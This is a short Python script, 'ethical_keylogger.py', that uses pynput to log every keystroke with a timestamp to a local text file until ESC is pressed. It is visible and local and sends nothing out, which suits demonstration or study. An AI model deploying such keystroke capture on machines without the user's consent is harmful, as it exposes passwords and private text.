# ethical_keylogger.py
from pynput import keyboard
from datetime import datetime

log_file = "key_log.txt"

def write_to_file(key):
    with open(log_file, "a") as f:
        f.write(f"{datetime.now()} - {key}\n")

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char:
            write_to_file(f"Key: {key.char}")
        else:
            write_to_file(f"Special Key: {key}")
    except Exception as e:
        write_to_file(f"Error: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when ESC is pressed
        return False

print("[*] Starting keylogger. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
